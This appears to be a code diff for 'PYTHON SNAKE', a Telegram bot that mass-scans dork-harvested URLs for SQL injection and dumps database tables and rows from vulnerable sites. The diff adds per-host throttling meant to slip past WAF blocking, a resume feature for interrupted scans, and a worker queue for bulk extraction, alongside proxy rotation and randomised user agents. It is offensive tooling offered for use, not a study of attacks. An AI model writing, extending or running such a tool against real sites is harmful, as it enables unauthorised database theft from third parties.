@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.18.0"
-BUILD = "url-truth-tsp"   # feature flags — /ping me dikhte hain
+VERSION = "v2.19.0"
+BUILD = "resume-pool"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -3403,6 +3403,31 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
     conn = mk_connector(limit=max(20, workers * 2), force_close=True)
     sem = asyncio.Semaphore(workers)
 
+    #  v2.19.0 — PER-HOST SPACING. Ek hi site par 40 parallel probes = WAF
+    #  block + galat "dead". Ab har host ki requests me gap (default 0.05s):
+    #  multi-host lists par koi asar nahi, single host par ~20 req/s cap.
+    #  /batch hostgap 0  → off
+    try:
+        _host_gap = max(0.0, min(2.0, float(sget("inj_host_gap_ms", 50) or 0) / 1000.0))
+    except Exception:
+        _host_gap = 0.05
+    _gap_lock = asyncio.Lock()
+    _gap_next = {}
+
+    async def _host_wait(host):
+        if _host_gap <= 0:
+            return
+        async with _gap_lock:
+            now = time.time()
+            nxt = _gap_next.get(host, 0.0)
+            if nxt <= now:
+                _gap_next[host] = now + _host_gap
+                return
+            _gap_next[host] = nxt + _host_gap
+            delay = nxt - now
+        if delay > 0:
+            await asyncio.sleep(min(delay, 2.0))
+
     async def _fetch(session, url, px=None, read=65536):
         kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
               "timeout": aiohttp.ClientTimeout(total=max(3.0, float(timeout))),
@@ -3454,6 +3479,7 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                 st["skipped"] += 1
                 await _finish(raw, skip=True)
             return
+        await _host_wait(host)
         async with sem:
             px = rot.next() if rot.enabled else None
             try:
@@ -6844,6 +6870,8 @@ async def _route_tool_cb(update, context, data: str):
         if rest == "clear":
             return await cb_proxy_clear(update, context)
     elif head == "inj":
+        if rest == "resume":
+            return await cb_inj_resume(update, context)
         if rest == "uhq":
             return await cb_inj_uhq(update, context)
         if rest == "go":
@@ -8897,6 +8925,10 @@ async def tool_inj(update, context):
     rows.append([InlineKeyboardButton("🚀 SEND URLS (re-arm input)", callback_data="inj:go")])
     rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % len(context.user_data.get("last_urls") or []),
                                       callback_data="inj:last")])
+    _rs = inj_resume_load()
+    if _rs["urls"]:
+        rows.append([InlineKeyboardButton("▶️ RESUME (%s URLs left)" % fmt(len(_rs["urls"])),
+                                          callback_data="inj:resume")])
     rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
     probes = inj_probes_for(cat)
     txt = (H("SQLi SCANNER", "step 1 — send URLs") + "\n\n"
@@ -9066,6 +9098,25 @@ def _inj_vuln_lines(vulns, n: int = 6) -> str:
     return "\n\n".join(out)
 
 
+async def cb_inj_resume(update, context):
+    """▶️ RESUME — disk par rakhi bachi hui URLs se scan dobara."""
+    q = update.callback_query
+    d = inj_resume_load()
+    urls = d.get("urls") or []
+    if not urls:
+        try:
+            await q.answer("Koi pending list nahi — sab scan ho chuka hai", show_alert=True)
+        except Exception:
+            pass
+        return
+    context.user_data["inj_cat"] = d.get("cat") or "all"
+    try:
+        await q.answer("▶️ Resuming %s URLs…" % fmt(len(urls)), show_alert=False)
+    except Exception:
+        pass
+    return await _run_inject(update, context, urls)
+
+
 async def cb_inj_uhq(update, context):
     """Injector ke confirmed vulnerable URLs → UHQ dorks (bina keywords)."""
     q = update.callback_query
@@ -9105,6 +9156,38 @@ async def cb_inj_uhq(update, context):
         pass
     path, cnt = dump_text(dorks, "uhq_from_vuln", "PYTHON SNAKE — UHQ dorks (from vuln URLs)")
     await send_file(update, path, "🔗 %d UHQ dorks" % cnt)
+
+
+RESUME_TAG = "inj_resume"
+
+
+def inj_resume_save(urls, cat: str = "all") -> int:
+    """Bachi hui URLs disk pe — bot restart ke baad bhi RESUME kaam karega."""
+    urls = _uniq([str(u) for u in (urls or []) if str(u).startswith("http")])
+    if not urls:
+        try:
+            os.remove(_path(RESUME_TAG))
+        except Exception:
+            pass
+        return 0
+    okk = jsave(RESUME_TAG, {"urls": urls[:500000], "cat": cat or "all",
+                             "ts": time.time()})
+    return len(urls) if okk else 0
+
+
+def inj_resume_load() -> dict:
+    d = jload(RESUME_TAG, {}) or {}
+    urls = [str(u) for u in (d.get("urls") or []) if str(u).startswith("http")]
+    cat = d.get("cat") if d.get("cat") in CAT_LABEL else "all"
+    age = max(0.0, time.time() - float(d.get("ts") or 0)) if d.get("ts") else 0.0
+    return {"urls": urls, "cat": cat or "all", "age": age}
+
+
+def inj_resume_clear() -> None:
+    try:
+        os.remove(_path(RESUME_TAG))
+    except Exception:
+        pass
 
 
 async def _run_inject(update, context, urls):
@@ -9179,7 +9262,18 @@ async def _run_inject(update, context, urls):
         await msg.delete()
     except Exception:
         pass
+    #  RESUME: jo URLs test hi nahi hue (STOP / crash) unhe disk pe rakh do
+    _done_set = set(st.get("done_urls") or [])
+    _remain = [u for u in urls if u not in _done_set]
+    _saved = 0
+    if _remain:
+        _saved = inj_resume_save(_remain, cat)
+    elif not _remain:
+        inj_resume_clear()
     _rows = []
+    if _saved:
+        _rows.append([InlineKeyboardButton("▶️ RESUME — %s URLs left" % fmt(_saved),
+                                           callback_data="inj:resume")])
     if n_v:
         _rows.append([InlineKeyboardButton("📁 DUMP THESE %d URL(s)" % n_v,
                                            callback_data="df:frominj")])
@@ -9187,6 +9281,10 @@ async def _run_inject(update, context, urls):
                                            callback_data="inj:uhq")])
     _rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
     _kb_done = RK(_rows)
+    if _saved:
+        body += ("\n\n" + B("▶️ Resume ready") + "\n"
+                 + "<i>%s URLs bache — STOP/crash ke baad bhi RESUME chalega "
+                   "(file disk par hai).</i>" % fmt(_saved))
     for ch in chunk_lines(body)[:3]:
         await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
                                            reply_markup=_kb_done)
@@ -10907,10 +11005,42 @@ async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
                     except Exception:
                         pass
 
+    #  v2.19.0 — bounded queue: pehle har URL ka coroutine ek saath banta tha
+    #  (20k URLs = 20k tasks → phone RAM). Ab N workers + queue.
+    _workers = max(1, min(8, int(conc or 3)))
+    q = asyncio.Queue(maxsize=max(32, _workers * 25))
+
+    async def worker(session):
+        while True:
+            if uid and stop_requested(uid):
+                return
+            item = await q.get()
+            if item is None:
+                await q.put(None)                 # baaki workers ke liye
+                return
+            await one(session, item[0], item[1])
+
+    async def feeder():
+        try:
+            for u in urls:
+                if uid and stop_requested(uid):
+                    break
+                await q.put((u, (targets or {}).get(u, "")))
+        finally:
+            for _ in range(_workers):
+                await q.put(None)
+
     async with aiohttp.ClientSession(connector=conn) as session:
-        await asyncio.gather(*[one(session, u, (targets or {}).get(u, "")) for u in urls])
+        _fd = asyncio.create_task(feeder())
+        try:
+            await asyncio.gather(*[worker(session) for _ in range(_workers)])
+        finally:
+            if not _fd.done():
+                _fd.cancel()
+            await asyncio.gather(_fd, return_exceptions=True)
     if uid and stop_requested(uid):
         st["stopped"] = 1
+    st["skipped"] = max(0, st["urls"] - st["done"])
     st["took"] = time.time() - st["start"]
     return st
 
@@ -11252,15 +11382,17 @@ def _sqli_caps() -> dict:
 def _dump_progress_card(st: dict, spin: int) -> str:
     pct = (st["done"] / max(1, st["urls"])) * 100
     took = max(0.001, time.time() - st["start"])
+    _spd = (st["done"] / took) if took > 0.5 else 0.0
     return (H("SQL DUMP", "live extraction") + "\n\n"
             + bar3(pct, 12, spin) + "\n\n"
             + "❖ URLs      : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
             + "❖ Injectable: <code>%s</code>\n" % fmt(st.get("injectable", 0))
             + "❖ Tables    : <code>%s</code>\n" % fmt(st.get("tables", 0))
             + "❖ Rows      : <code>%s</code>\n" % fmt(st.get("rows", 0))
+            + "❖ Speed     : <code>%.2f URLs/s</code>\n" % _spd
             + "❖ Stage     : <b>%s</b> <i>%s</i>\n" % (esc(st.get("stage") or "-"),
                                                     esc(st.get("stage_info") or ""))
-            + "❖ Elapsed   : <code>%.1fs</code>" % took)
+            + "❖ Elapsed   : <code>%s</code>" % fmt_eta(took))
 
 
 def _dump_status_line(res: dict) -> str:
@@ -11320,6 +11452,8 @@ async def _run_sqldump(update, context, urls, targets=None):
             + "❖ Tables  : <code>%s</code>\n" % fmt(st["tables"])
             + "❖ Rows    : <code>%s</code>\n" % fmt(st["rows"])
             + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
+            + (("⛔ Not tested (stopped): <code>%s</code>\n" % fmt(st.get("skipped", 0)))
+               if st.get("skipped") else "")
             + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
                if large else "")
             + (("ℹ️ <i>Injector \"vulnerable\" = payload reflect/error mila. "
@@ -13913,6 +14047,7 @@ BATCH_KEYS = {
     "threads": ("parse_threads", 2, 24, "Parser parallel dorks", 12, "🧵"),
     "ptimeout": ("parse_timeout", 4, 40, "Parser engine timeout (s)", 8, "⏱"),
     "precheck": ("inj_precheck", 0, 300, "Precheck time cap (s, 0=off)", 45, "🏓"),
+    "hostgap": ("inj_host_gap_ms", 0, 2000, "Per-host gap (ms, 0=off)", 50, "⏳"),
     "rawcap":  ("parse_raw_cap", 1000, 1000000, "Parser raw URL cap", 200000, "🧾"),
     "tsp":     ("tsp_count", 10, 100000, "TSP dork amount", 2000, "🧰"),
     "tspnum":  ("tsp_numbers", 1, 9999, "TSP number range", 99, "🔢"),
